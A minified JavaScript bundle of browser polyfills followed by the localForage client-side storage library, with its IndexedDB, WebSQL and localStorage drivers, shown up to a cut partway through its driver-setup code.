String.prototype.trim||(String.prototype.trim=function(){return this.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")}),Date.now=Date.now||function(){return+new Date},function(){if(void 0===window.performance&&(window.performance={}),!window.performance.now){var e=Date.now();performance.timing&&performance.timing.navigationStart&&(e=performance.timing.navigationStart),window.performance.now=function(){return Date.now()-e}}}(),String.prototype.endsWith||(String.prototype.endsWith=function(e,t){var n=this.toString();("number"!=typeof t||!isFinite(t)||Math.floor(t)!==t||t>n.length)&&(t=n.length),t-=e.length;var o=n.indexOf(e,t);return-1!==o&&o===t}),String.prototype.startsWith||(String.prototype.startsWith=function(e,t){return t=t||0,this.substr(t,e.length)===e}),function(){"use strict";for(var e=0,t=["ms","moz","webkit","o"],n=!(!window.performance||!window.performance.now),o=0,i=t.length;o<i&&!window.requestAnimationFrame;o+=1)window.requestAnimationFrame=window[t[o]+"RequestAnimationFrame"],window.cancelAnimationFrame=window[t[o]+"CancelAnimationFrame"]||window[t[o]+"CancelRequestAnimationFrame"];if(!/iP(ad|hone|od).*OS 6/.test(window.navigator.userAgent)&&window.requestAnimationFrame||(window.requestAnimationFrame=function(t,n){var o=(new Date).getTime(),i=Math.max(0,16-(o-e)),r=window.setTimeout((function(){t(o+i)}),i);return e=o+i,r}),window.cancelAnimationFrame||(window.cancelAnimationFrame=function(e){clearTimeout(e)}),!n){var r=window.requestAnimationFrame,a=+new Date;window.requestAnimationFrame=function(e,t){r((function(t){return e(t<1e12?t:t-a)}),t)}}}(),String.prototype.repeat||(String.prototype.repeat=function(e){"use strict";if(null==this)throw new TypeError("can't convert "+this+" to object");var t=""+this;if((e=+e)!=e&&(e=0),e<0)throw new RangeError("repeat count must be non-negative");if(e==1/0)throw new RangeError("repeat count must be less than infinity");if(e=Math.floor(e),0==t.length||0==e)return"";if(t.length*e>=1<<28)throw new RangeError("repeat count must not overflow maximum string size");for(var n="";1==(1&e)&&(n+=t),0!=(e>>>=1);)t+=t;return n}),function(e){"use strict";e.console=e.console||{};for(var t,n,o=e.console,i={},r=function(){},a="memory".split(","),s="assert,clear,count,debug,dir,dirxml,error,exception,group,groupCollapsed,groupEnd,info,log,markTimeline,profile,profiles,profileEnd,show,table,time,timeEnd,timeline,timelineEnd,timeStamp,trace,warn".split(",");t=a.pop();)o[t]=o[t]||i;for(;n=s.pop();)o[n]=o[n]||r}("undefined"==typeof window?this:window),Object.assign||Object.defineProperty(Object,"assign",{enumerable:!1,configurable:!0,writable:!0,value:function(e){"use strict";if(null==e)throw new TypeError("Cannot convert first argument to object");for(var t=Object(e),n=1;n<arguments.length;n++){var o=arguments[n];if(null!=o){o=Object(o);for(var i=Object.keys(o),r=0,a=i.length;r<a;r++){var s=i[r],l=Object.getOwnPropertyDescriptor(o,s);void 0!==l&&l.enumerable&&(t[s]=o[s])}}}return t}}),function(e,t){"use strict";if(!e.setImmediate){var n,o,i,r,a,s=1,l={},c=!1,u=e.document,d=Object.getPrototypeOf&&Object.getPrototypeOf(e);d=d&&d.setTimeout?d:e,n="[object process]"==={}.toString.call(e.process)?function(e){process.nextTick((function(){p(e)}))}:function(){if(e.postMessage&&!e.importScripts){var t=!0,n=e.onmessage;return e.onmessage=function(){t=!1},e.postMessage("","*"),e.onmessage=n,t}}()?(r="setImmediate$"+Math.random()+"$",a=function(t){t.source===e&&"string"==typeof t.data&&0===t.data.indexOf(r)&&p(+t.data.slice(r.length))},e.addEventListener?e.addEventListener("message",a,!1):e.attachEvent("onmessage",a),function(t){e.postMessage(r+t,"*")}):e.MessageChannel?((i=new MessageChannel).port1.onmessage=function(e){p(e.data)},function(e){i.port2.postMessage(e)}):u&&"onreadystatechange"in u.createElement("script")?(o=u.documentElement,function(e){var t=u.createElement("script");t.onreadystatechange=function(){p(e),t.onreadystatechange=null,o.removeChild(t),t=null},o.appendChild(t)}):function(e){setTimeout(p,0,e)},d.setImmediate=function(e){"function"!=typeof e&&(e=new Function(""+e));for(var t=new Array(arguments.length-1),o=0;o<t.length;o++)t[o]=arguments[o+1];var i={callback:e,args:t};return l[s]=i,n(s),s++},d.clearImmediate=f}function f(e){delete l[e]}function p(e){if(c)setTimeout(p,0,e);else{var t=l[e];if(t){c=!0;try{!function(e){var t=e.callback,n=e.args;switch(n.length){case 0:t();break;case 1:t(n[0]);break;case 2:t(n[0],n[1]);break;case 3:t(n[0],n[1],n[2]);break;default:t.apply(undefined,n)}}(t)}finally{f(e),c=!1}}}}}("undefined"==typeof self?"undefined"==typeof global?this:global:self),function(e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define([],e):("undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:this).localforage=e()}((function(){return function e(t,n,o){function i(a,s){if(!n[a]){if(!t[a]){var l="function"==typeof require&&require;if(!s&&l)return l(a,!0);if(r)return r(a,!0);var c=new Error("Cannot find module '"+a+"'");throw c.code="MODULE_NOT_FOUND",c}var u=n[a]={exports:{}};t[a][0].call(u.exports,(function(e){return i(t[a][1][e]||e)}),u,u.exports,e,t,n,o)}return n[a].exports}for(var r="function"==typeof require&&require,a=0;a<o.length;a++)i(o[a]);return i}({1:[function(e,t,n){(function(e){"use strict";var n,o,i=e.MutationObserver||e.WebKitMutationObserver;if(i){var r=0,a=new i(u),s=e.document.createTextNode("");a.observe(s,{characterData:!0}),n=function(){s.data=r=++r%2}}else if(e.setImmediate||void 0===e.MessageChannel)n="document"in e&&"onreadystatechange"in e.document.createElement("script")?function(){var t=e.document.createElement("script");t.onreadystatechange=function(){u(),t.onreadystatechange=null,t.parentNode.removeChild(t),t=null},e.document.documentElement.appendChild(t)}:function(){setTimeout(u,0)};else{var l=new e.MessageChannel;l.port1.onmessage=u,n=function(){l.port2.postMessage(0)}}var c=[];function u(){var e,t;o=!0;for(var n=c.length;n;){for(t=c,c=[],e=-1;++e<n;)t[e]();n=c.length}o=!1}t.exports=function(e){1!==c.push(e)||o||n()}}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{}],2:[function(e,t,n){"use strict";var o=e(1);function i(){}var r={},a=["REJECTED"],s=["FULFILLED"],l=["PENDING"];function c(e){if("function"!=typeof e)throw new TypeError("resolver must be a function");this.state=l,this.queue=[],this.outcome=void 0,e!==i&&p(this,e)}function u(e,t,n){this.promise=e,"function"==typeof t&&(this.onFulfilled=t,this.callFulfilled=this.otherCallFulfilled),"function"==typeof n&&(this.onRejected=n,this.callRejected=this.otherCallRejected)}function d(e,t,n){o((function(){var o;try{o=t(n)}catch(o){return r.reject(e,o)}o===e?r.reject(e,new TypeError("Cannot resolve promise with itself")):r.resolve(e,o)}))}function f(e){var t=e&&e.then;if(e&&"object"==typeof e&&"function"==typeof t)return function(){t.apply(e,arguments)}}function p(e,t){var n=!1;function o(t){n||(n=!0,r.reject(e,t))}function i(t){n||(n=!0,r.resolve(e,t))}var a=m((function(){t(i,o)}));"error"===a.status&&o(a.value)}function m(e,t){var n={};try{n.value=e(t),n.status="success"}catch(e){n.status="error",n.value=e}return n}t.exports=n=c,c.prototype.catch=function(e){return this.then(null,e)},c.prototype.then=function(e,t){if("function"!=typeof e&&this.state===s||"function"!=typeof t&&this.state===a)return this;var n=new this.constructor(i);return this.state!==l?d(n,this.state===s?e:t,this.outcome):this.queue.push(new u(n,e,t)),n},u.prototype.callFulfilled=function(e){r.resolve(this.promise,e)},u.prototype.otherCallFulfilled=function(e){d(this.promise,this.onFulfilled,e)},u.prototype.callRejected=function(e){r.reject(this.promise,e)},u.prototype.otherCallRejected=function(e){d(this.promise,this.onRejected,e)},r.resolve=function(e,t){var n=m(f,t);if("error"===n.status)return r.reject(e,n.value);var o=n.value;if(o)p(e,o);else{e.state=s,e.outcome=t;for(var i=-1,a=e.queue.length;++i<a;)e.queue[i].callFulfilled(t)}return e},r.reject=function(e,t){e.state=a,e.outcome=t;for(var n=-1,o=e.queue.length;++n<o;)e.queue[n].callRejected(t);return e},n.resolve=function(e){return e instanceof this?e:r.resolve(new this(i),e)},n.reject=function(e){var t=new this(i);return r.reject(t,e)},n.all=function(e){var t=this;if("[object Array]"!==Object.prototype.toString.call(e))return this.reject(new TypeError("must be an array"));var n=e.length,o=!1;if(!n)return this.resolve([]);for(var a=new Array(n),s=0,l=-1,c=new this(i);++l<n;)u(e[l],l);return c;function u(e,i){t.resolve(e).then((function(e){a[i]=e,++s!==n||o||(o=!0,r.resolve(c,a))}),(function(e){o||(o=!0,r.reject(c,e))}))}},n.race=function(e){if("[object Array]"!==Object.prototype.toString.call(e))return this.reject(new TypeError("must be an array"));var t=e.length,n=!1;if(!t)return this.resolve([]);for(var o,a=-1,s=new this(i);++a<t;)o=e[a],this.resolve(o).then((function(e){n||(n=!0,r.resolve(s,e))}),(function(e){n||(n=!0,r.reject(s,e))}));return s}},{1:1}],3:[function(e,t,n){(function(t){"use strict";"function"!=typeof t.Promise&&(t.Promise=e(2))}).call(this,"undefined"!=typeof global?global:"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{2:2}],4:[function(e,t,n){"use strict";var o="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},i=function(){try{if("undefined"!=typeof indexedDB)return indexedDB;if("undefined"!=typeof webkitIndexedDB)return webkitIndexedDB;if("undefined"!=typeof mozIndexedDB)return mozIndexedDB;if("undefined"!=typeof OIndexedDB)return OIndexedDB;if("undefined"!=typeof msIndexedDB)return msIndexedDB}catch(e){}}();function r(e,t){e=e||[],t=t||{};try{return new Blob(e,t)}catch(i){if("TypeError"!==i.name)throw i;for(var n=new("undefined"!=typeof BlobBuilder?BlobBuilder:"undefined"!=typeof MSBlobBuilder?MSBlobBuilder:"undefined"!=typeof MozBlobBuilder?MozBlobBuilder:WebKitBlobBuilder),o=0;o<e.length;o+=1)n.append(e[o]);return n.getBlob(t.type)}}"undefined"==typeof Promise&&e(3);var a=Promise;function s(e,t){t&&e.then((function(e){t(null,e)}),(function(e){t(e)}))}function l(e,t,n){"function"==typeof t&&e.then(t),"function"==typeof n&&e.catch(n)}var c,u,d="local-forage-detect-blob-support",f=Object.prototype.toString,p="readonly",m="readwrite";function h(e){return"boolean"==typeof c?a.resolve(c):function(e){return new a((function(t){var n=e.transaction(d,m),o=r([""]);n.objectStore(d).put(o,"key"),n.onabort=function(e){e.preventDefault(),e.stopPropagation(),t(!1)},n.oncomplete=function(){var e=navigator.userAgent.match(/Chrome\/(\d+)/),n=navigator.userAgent.match(/Edge\//);t(n||!e||43<=parseInt(e[1],10))}})).catch((function(){return!1}))}(e).then((function(e){return c=e}))}function g(e){var t=u[e.name],n={};n.promise=new a((function(e){n.resolve=e})),t.deferredOperations.push(n),t.dbReady?t.dbReady=t.dbReady.then((function(){return n.promise})):t.dbReady=n.promise}function v(e,t){return new a((function(n,o){if(e.db){if(!t)return n(e.db);g(e),e.db.close()}var r=[e.name];t&&r.push(e.version);var a=i.open.apply(i,r);t&&(a.onupgradeneeded=function(t){var n=a.result;try{n.createObjectStore(e.storeName),t.oldVersion<=1&&n.createObjectStore(d)}catch(n){if("ConstraintError"!==n.name)throw n;console.warn('The database "'+e.name+'" has been upgraded from version '+t.oldVersion+" to version "+t.newVersion+', but the storage "'+e.storeName+'" already exists.')}}),a.onerror=function(e){e.preventDefault(),o(a.error)},a.onsuccess=function(){n(a.result),function(e){var t=u[e.name].deferredOperations.pop();t&&t.resolve()}(e)}}))}function y(e){return r([function(e){for(var t=e.length,n=new ArrayBuffer(t),o=new Uint8Array(n),i=0;i<t;i++)o[i]=e.charCodeAt(i);return n}(atob(e.data))],{type:e.type})}function _(e){return e&&e.__local_forage_encoded_blob}function b(e){var t=this,n=t._initReady().then((function(){var e=u[t._dbInfo.name];if(e&&e.dbReady)return e.dbReady}));return l(n,e,e),n}function w(e,t,n){try{var o=e.db.transaction(e.storeName,t);n(null,o)}catch(o){if(!e.db||"InvalidStateError"===o.name)return function(e){g(e);for(var t=u[e.name].forages,n=0;n<t.length;n++)t[n]._dbInfo.db&&(t[n]._dbInfo.db.close(),t[n]._dbInfo.db=null);return v(e,!1).then((function(e){for(var n=0;n<t.length;n++)t[n]._dbInfo.db=e})).catch((function(t){throw function(e,t){var n=u[e.name].deferredOperations.pop();n&&n.reject(t)}(e,t),t}))}(e).then((function(){var o=e.db.transaction(e.storeName,t);n(null,o)}));n(o)}}var x={_driver:"asyncStorage",_initStorage:function(e){var t=this,n={db:null};if(e)for(var o in e)n[o]=e[o];u||(u={});var i=u[n.name];i||(i={forages:[],db:null,dbReady:null,deferredOperations:[]},u[n.name]=i),i.forages.push(t),t._initReady||(t._initReady=t.ready,t.ready=b);var r=[];function s(){return a.resolve()}for(var l=0;l<i.forages.length;l++){var c=i.forages[l];c!==t&&r.push(c._initReady().catch(s))}var d=i.forages.slice(0);return a.all(r).then((function(){return n.db=i.db,function(e){return v(e,!1)}(n)})).then((function(e){return n.db=e,function(e,t){if(!e.db)return!0;var n=!e.db.objectStoreNames.contains(e.storeName),o=e.version<e.db.version,i=e.version>e.db.version;if(o&&(e.version!==t&&console.warn('The database "'+e.name+"\" can't be downgraded from version "+e.db.version+" to version "+e.version+"."),e.version=e.db.version),i||n){if(n){var r=e.db.version+1;r>e.version&&(e.version=r)}return!0}return!1}(n,t._defaultConfig.version)?function(e){return v(e,!0)}(n):e})).then((function(e){n.db=i.db=e,t._dbInfo=n;for(var o=0;o<d.length;o++){var r=d[o];r!==t&&(r._dbInfo.db=n.db,r._dbInfo.version=n.version)}}))},iterate:function(e,t){var n=this,o=new a((function(t,o){n.ready().then((function(){w(n._dbInfo,p,(function(i,r){if(i)return o(i);try{var a=r.objectStore(n._dbInfo.storeName).openCursor(),s=1;a.onsuccess=function(){var n=a.result;if(n){var o=n.value;_(o)&&(o=y(o));var i=e(o,n.key,s++);void 0!==i?t(i):n.continue()}else t()},a.onerror=function(){o(a.error)}}catch(i){o(i)}}))})).catch(o)}));return s(o,t),o},getItem:function(e,t){var n=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var o=new a((function(t,o){n.ready().then((function(){w(n._dbInfo,p,(function(i,r){if(i)return o(i);try{var a=r.objectStore(n._dbInfo.storeName).get(e);a.onsuccess=function(){var e=a.result;void 0===e&&(e=null),_(e)&&(e=y(e)),t(e)},a.onerror=function(){o(a.error)}}catch(i){o(i)}}))})).catch(o)}));return s(o,t),o},setItem:function(e,t,n){var o=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var i=new a((function(n,i){var r;o.ready().then((function(){return r=o._dbInfo,"[object Blob]"===f.call(t)?h(r.db).then((function(e){return e?t:function(e){return new a((function(t,n){var o=new FileReader;o.onerror=n,o.onloadend=function(n){var o=btoa(n.target.result||"");t({__local_forage_encoded_blob:!0,data:o,type:e.type})},o.readAsBinaryString(e)}))}(t)})):t})).then((function(t){w(o._dbInfo,m,(function(r,a){if(r)return i(r);try{var s=a.objectStore(o._dbInfo.storeName).put(t,e);null===t&&(t=void 0),a.oncomplete=function(){void 0===t&&(t=null),n(t)},a.onabort=a.onerror=function(){var e=s.error?s.error:s.transaction.error;i(e)}}catch(r){i(r)}}))})).catch(i)}));return s(i,n),i},removeItem:function(e,t){var n=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var o=new a((function(t,o){n.ready().then((function(){w(n._dbInfo,m,(function(i,r){if(i)return o(i);try{var a=r.objectStore(n._dbInfo.storeName).delete(e);r.oncomplete=function(){t()},r.onerror=function(){o(a.error)},r.onabort=function(){var e=a.error?a.error:a.transaction.error;o(e)}}catch(i){o(i)}}))})).catch(o)}));return s(o,t),o},clear:function(e){var t=this,n=new a((function(e,n){t.ready().then((function(){w(t._dbInfo,m,(function(o,i){if(o)return n(o);try{var r=i.objectStore(t._dbInfo.storeName).clear();i.oncomplete=function(){e()},i.onabort=i.onerror=function(){var e=r.error?r.error:r.transaction.error;n(e)}}catch(o){n(o)}}))})).catch(n)}));return s(n,e),n},length:function(e){var t=this,n=new a((function(e,n){t.ready().then((function(){w(t._dbInfo,p,(function(o,i){if(o)return n(o);try{var r=i.objectStore(t._dbInfo.storeName).count();r.onsuccess=function(){e(r.result)},r.onerror=function(){n(r.error)}}catch(o){n(o)}}))})).catch(n)}));return s(n,e),n},key:function(e,t){var n=this,o=new a((function(t,o){e<0?t(null):n.ready().then((function(){w(n._dbInfo,p,(function(i,r){if(i)return o(i);try{var a=r.objectStore(n._dbInfo.storeName),s=!1,l=a.openCursor();l.onsuccess=function(){var n=l.result;n?0===e||s?t(n.key):(s=!0,n.advance(e)):t(null)},l.onerror=function(){o(l.error)}}catch(i){o(i)}}))})).catch(o)}));return s(o,t),o},keys:function(e){var t=this,n=new a((function(e,n){t.ready().then((function(){w(t._dbInfo,p,(function(o,i){if(o)return n(o);try{var r=i.objectStore(t._dbInfo.storeName).openCursor(),a=[];r.onsuccess=function(){var t=r.result;t?(a.push(t.key),t.continue()):e(a)},r.onerror=function(){n(r.error)}}catch(o){n(o)}}))})).catch(n)}));return s(n,e),n}},$="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",E=/^~~local_forage_type~([^~]+)~/,k="__lfsc__:",S=k.length,L="arbf",A="blob",N=S+L.length,O=Object.prototype.toString;function C(e){var t,n,o,i,r,a=.75*e.length,s=e.length,l=0;"="===e[e.length-1]&&(a--,"="===e[e.length-2]&&a--);var c=new ArrayBuffer(a),u=new Uint8Array(c);for(t=0;t<s;t+=4)n=$.indexOf(e[t]),o=$.indexOf(e[t+1]),i=$.indexOf(e[t+2]),r=$.indexOf(e[t+3]),u[l++]=n<<2|o>>4,u[l++]=(15&o)<<4|i>>2,u[l++]=(3&i)<<6|63&r;return c}function T(e){var t,n=new Uint8Array(e),o="";for(t=0;t<n.length;t+=3)o+=$[n[t]>>2],o+=$[(3&n[t])<<4|n[t+1]>>4],o+=$[(15&n[t+1])<<2|n[t+2]>>6],o+=$[63&n[t+2]];return n.length%3==2?o=o.substring(0,o.length-1)+"=":n.length%3==1&&(o=o.substring(0,o.length-2)+"=="),o}var I={serialize:function(e,t){var n="";if(e&&(n=O.call(e)),e&&("[object ArrayBuffer]"===n||e.buffer&&"[object ArrayBuffer]"===O.call(e.buffer))){var o,i=k;e instanceof ArrayBuffer?(o=e,i+=L):(o=e.buffer,"[object Int8Array]"===n?i+="si08":"[object Uint8Array]"===n?i+="ui08":"[object Uint8ClampedArray]"===n?i+="uic8":"[object Int16Array]"===n?i+="si16":"[object Uint16Array]"===n?i+="ur16":"[object Int32Array]"===n?i+="si32":"[object Uint32Array]"===n?i+="ui32":"[object Float32Array]"===n?i+="fl32":"[object Float64Array]"===n?i+="fl64":t(new Error("Failed to get type for BinaryArray"))),t(i+T(o))}else if("[object Blob]"===n){var r=new FileReader;r.onload=function(){var n="~~local_forage_type~"+e.type+"~"+T(this.result);t(k+A+n)},r.readAsArrayBuffer(e)}else try{t(JSON.stringify(e))}catch(n){console.error("Couldn't convert value into a JSON string: ",e),t(null,n)}},deserialize:function(e){if(e.substring(0,S)!==k)return JSON.parse(e);var t,n=e.substring(N),o=e.substring(S,N);if(o===A&&E.test(n)){var i=n.match(E);t=i[1],n=n.substring(i[0].length)}var a=C(n);switch(o){case L:return a;case A:return r([a],{type:t});case"si08":return new Int8Array(a);case"ui08":return new Uint8Array(a);case"uic8":return new Uint8ClampedArray(a);case"si16":return new Int16Array(a);case"ur16":return new Uint16Array(a);case"si32":return new Int32Array(a);case"ui32":return new Uint32Array(a);case"fl32":return new Float32Array(a);case"fl64":return new Float64Array(a);default:throw new Error("Unkown type: "+o)}},stringToBuffer:C,bufferToString:T},j={_driver:"webSQLStorage",_initStorage:function(e){var t=this,n={db:null};if(e)for(var o in e)n[o]="string"!=typeof e[o]?e[o].toString():e[o];var i=new a((function(e,o){try{n.db=openDatabase(n.name,String(n.version),n.description,n.size)}catch(e){return o(e)}n.db.transaction((function(i){i.executeSql("CREATE TABLE IF NOT EXISTS "+n.storeName+" (id INTEGER PRIMARY KEY, key unique, value)",[],(function(){t._dbInfo=n,e()}),(function(e,t){o(t)}))}))}));return n.serializer=I,i},iterate:function(e,t){var n=this,o=new a((function(t,o){n.ready().then((function(){var i=n._dbInfo;i.db.transaction((function(n){n.executeSql("SELECT * FROM "+i.storeName,[],(function(n,o){for(var r=o.rows,a=r.length,s=0;s<a;s++){var l=r.item(s),c=l.value;if(c&&(c=i.serializer.deserialize(c)),void 0!==(c=e(c,l.key,s+1)))return void t(c)}t()}),(function(e,t){o(t)}))}))})).catch(o)}));return s(o,t),o},getItem:function(e,t){var n=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var o=new a((function(t,o){n.ready().then((function(){var i=n._dbInfo;i.db.transaction((function(n){n.executeSql("SELECT * FROM "+i.storeName+" WHERE key = ? LIMIT 1",[e],(function(e,n){var o=n.rows.length?n.rows.item(0).value:null;o&&(o=i.serializer.deserialize(o)),t(o)}),(function(e,t){o(t)}))}))})).catch(o)}));return s(o,t),o},setItem:function(e,t,n){return function e(t,n,o,i){var r=this;"string"!=typeof t&&(console.warn(t+" used as a key, but it is not a string."),t=String(t));var l=new a((function(a,s){r.ready().then((function(){void 0===n&&(n=null);var l=n,c=r._dbInfo;c.serializer.serialize(n,(function(n,u){u?s(u):c.db.transaction((function(e){e.executeSql("INSERT OR REPLACE INTO "+c.storeName+" (key, value) VALUES (?, ?)",[t,n],(function(){a(l)}),(function(e,t){s(t)}))}),(function(n){if(n.code===n.QUOTA_ERR){if(0<i)return void a(e.apply(r,[t,l,o,i-1]));s(n)}}))}))})).catch(s)}));return s(l,o),l}.apply(this,[e,t,n,1])},removeItem:function(e,t){var n=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var o=new a((function(t,o){n.ready().then((function(){var i=n._dbInfo;i.db.transaction((function(n){n.executeSql("DELETE FROM "+i.storeName+" WHERE key = ?",[e],(function(){t()}),(function(e,t){o(t)}))}))})).catch(o)}));return s(o,t),o},clear:function(e){var t=this,n=new a((function(e,n){t.ready().then((function(){var o=t._dbInfo;o.db.transaction((function(t){t.executeSql("DELETE FROM "+o.storeName,[],(function(){e()}),(function(e,t){n(t)}))}))})).catch(n)}));return s(n,e),n},length:function(e){var t=this,n=new a((function(e,n){t.ready().then((function(){var o=t._dbInfo;o.db.transaction((function(t){t.executeSql("SELECT COUNT(key) as c FROM "+o.storeName,[],(function(t,n){var o=n.rows.item(0).c;e(o)}),(function(e,t){n(t)}))}))})).catch(n)}));return s(n,e),n},key:function(e,t){var n=this,o=new a((function(t,o){n.ready().then((function(){var i=n._dbInfo;i.db.transaction((function(n){n.executeSql("SELECT key FROM "+i.storeName+" WHERE id = ? LIMIT 1",[e+1],(function(e,n){var o=n.rows.length?n.rows.item(0).key:null;t(o)}),(function(e,t){o(t)}))}))})).catch(o)}));return s(o,t),o},keys:function(e){var t=this,n=new a((function(e,n){t.ready().then((function(){var o=t._dbInfo;o.db.transaction((function(t){t.executeSql("SELECT key FROM "+o.storeName,[],(function(t,n){for(var o=[],i=0;i<n.rows.length;i++)o.push(n.rows.item(i).key);e(o)}),(function(e,t){n(t)}))}))})).catch(n)}));return s(n,e),n}},R={_driver:"localStorageWrapper",_initStorage:function(e){var t={};if(e)for(var n in e)t[n]=e[n];return t.keyPrefix=t.name+"/",t.storeName!==this._defaultConfig.storeName&&(t.keyPrefix+=t.storeName+"/"),(this._dbInfo=t).serializer=I,a.resolve()},iterate:function(e,t){var n=this,o=n.ready().then((function(){for(var t=n._dbInfo,o=t.keyPrefix,i=o.length,r=localStorage.length,a=1,s=0;s<r;s++){var l=localStorage.key(s);if(0===l.indexOf(o)){var c=localStorage.getItem(l);if(c&&(c=t.serializer.deserialize(c)),void 0!==(c=e(c,l.substring(i),a++)))return c}}}));return s(o,t),o},getItem:function(e,t){var n=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var o=n.ready().then((function(){var t=n._dbInfo,o=localStorage.getItem(t.keyPrefix+e);return o&&(o=t.serializer.deserialize(o)),o}));return s(o,t),o},setItem:function(e,t,n){var o=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var i=o.ready().then((function(){void 0===t&&(t=null);var n=t;return new a((function(i,r){var a=o._dbInfo;a.serializer.serialize(t,(function(t,o){if(o)r(o);else try{localStorage.setItem(a.keyPrefix+e,t),i(n)}catch(t){"QuotaExceededError"!==t.name&&"NS_ERROR_DOM_QUOTA_REACHED"!==t.name||r(t),r(t)}}))}))}));return s(i,n),i},removeItem:function(e,t){var n=this;"string"!=typeof e&&(console.warn(e+" used as a key, but it is not a string."),e=String(e));var o=n.ready().then((function(){var t=n._dbInfo;localStorage.removeItem(t.keyPrefix+e)}));return s(o,t),o},clear:function(e){var t=this,n=t.ready().then((function(){for(var e=t._dbInfo.keyPrefix,n=localStorage.length-1;0<=n;n--){var o=localStorage.key(n);0===o.indexOf(e)&&localStorage.removeItem(o)}}));return s(n,e),n},length:function(e){var t=this.keys().then((function(e){return e.length}));return s(t,e),t},key:function(e,t){var n=this,o=n.ready().then((function(){var t,o=n._dbInfo;try{t=localStorage.key(e)}catch(o){t=null}return t&&(t=t.substring(o.keyPrefix.length)),t}));return s(o,t),o},keys:function(e){var t=this,n=t.ready().then((function(){for(var e=t._dbInfo,n=localStorage.length,o=[],i=0;i<n;i++)0===localStorage.key(i).indexOf(e.keyPrefix)&&o.push(localStorage.key(i).substring(e.keyPrefix.length));return o}));return s(n,e),n}},P={},D={INDEXEDDB:"asyncStorage",LOCALSTORAGE:"localStorageWrapper",WEBSQL:"webSQLStorage"},z=[D.INDEXEDDB,D.WEBSQL,D.LOCALSTORAGE],M=["clear","getItem","iterate","key","keys","length","removeItem","setItem"],B={description:"",driver:z.slice(),name:"localforage",size:4980736,storeName:"keyvaluepairs",version:1},F={};F[D.INDEXEDDB]=function(){try{if(!i)return!1;var e="undefined"!=typeof openDatabase&&/(Safari|iPhone|iPad|iPod)/.test(navigator.userAgent)&&!/Chrome/.test(navigator.userAgent)&&!/BlackBerry/.test(navigator.platform),t="function"==typeof fetch&&-1!==fetch.toString().indexOf("[native code");return(!e||t)&&"undefined"!=typeof indexedDB&&"undefined"!=typeof IDBKeyRange}catch(e){return!1}}(),F[D.WEBSQL]="function"==typeof openDatabase,F[D.LOCALSTORAGE]=function(){try{return"undefined"!=typeof localStorage&&"setItem"in localStorage&&localStorage.setItem}catch(e){return!1}}();var H=Array.isArray||function(e){return"[object Array]"===Object.prototype.toString.call(e)};function q(e,t){e[t]=function(){var n=arguments;return e.ready().then((function(){return e[t].apply(e,n)}))}}function W(){for(var e=1;e<arguments.length;e++){var t=arguments[e];if(t)for(var n in t)t.hasOwnProperty(n)&&(H(t[n])?arguments[0][n]=t[n].slice():arguments[0][n]=t[n])}return arguments[0]}function U(e){for(var t in D)if(D.hasOwnProperty(t)&&D[t]===e)return!0;return!1}var X=new(function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.INDEXEDDB=D.INDEXEDDB,this.LOCALSTORAGE=D.LOCALSTORAGE,this.WEBSQL=D.WEBSQL,this._defaultConfig=W({},B),this._config=W({},this._defaultConfig,t),this._driverSet=null,this._initDriver=null,this._ready=!1,this._dbInfo=null,this._wrapLibraryMethodsWithReady(),this.setDriver(this._config.driver).catch((function(){}))}return e.prototype.config=function(e){if("object"!==(void 0===e?"undefined":o(e)))return"string"==typeof e?this._config[e]:this._config;if(this._ready)return new Error("Can't call config() after localforage has been used.");for(var t in e){if("storeName"===t&&(e[t]=e[t].replace(/\W/g,"_")),"version"===t&&"number"!=typeof e[t])return new Error("Database version must be a number.");this._config[t]=e[t]}return!("driver"in e&&e.driver)||this.setDriver(this._config.driver)},e.prototype.defineDriver=function(e,t,n){var o=new a((function(t,n){try{var o=e._driver,i=new Error("Custom driver not compliant; see https://mozilla.github.io/localForage/#definedriver"),r=new Error("Custom driver name already in use: "+e._driver);if(!e._driver)return void n(i);if(U(e._driver))return void n(r);for(var a=M.concat("_initStorage"),s=0;s<a.length;s++){var l=a[s];if(!l||!e[l]||"function"!=typeof e[l])return void n(i)}var c=function(n){F[o]=n,P[o]=e,t()};"_support"in e?e._support&&"function"==typeof e._support?e._support().then(c,n):c(!!e._support):c(!0)}catch(i){n(i)}}));return l(o,t,n),o},e.prototype.driver=function(){return this._driver||null},e.prototype.getDriver=function(e,t,n){var o=this,i=a.resolve().then((function(){if(!U(e)){if(P[e])return P[e];throw new Error("Driver not found.")}switch(e){case o.INDEXEDDB:return x;case o.LOCALSTORAGE:return R;case o.WEBSQL:return j}}));return l(i,t,n),i},e.prototype.getSerializer=function(e){var t=a.resolve(I);return l(t,e),t},e.prototype.ready=function(e){var t=this,n=t._driverSet.then((function(){return null===t._ready&&(t._ready=t._initDriver()),t._ready}));return l(n,e,e),n},e.prototype.setDriver=function(e,t,n){var o=this;H(e)||(e=[e]);var i=this._getSupportedDrivers(e);function r(){o._config.driver=o.driver()}function s(e){return o._extend(e),r(),o._ready=o._initStorage(o._config),o._ready}var c=null!==this._driverSet?this._driverSet.catch((function(){return a.resolve()})):a.resolve();return this._driverSet=c.then((function(){var e=i[0];return o._dbInfo=null,o._ready=null,o.getDriver(e).then((function(e){o._driver=e._driver,r(),o._wrapLibraryMethodsWithReady(),o._initDriver=function(e){return function(){var t=0;return function n(){for(;t<e.length;){var i=e[t];return 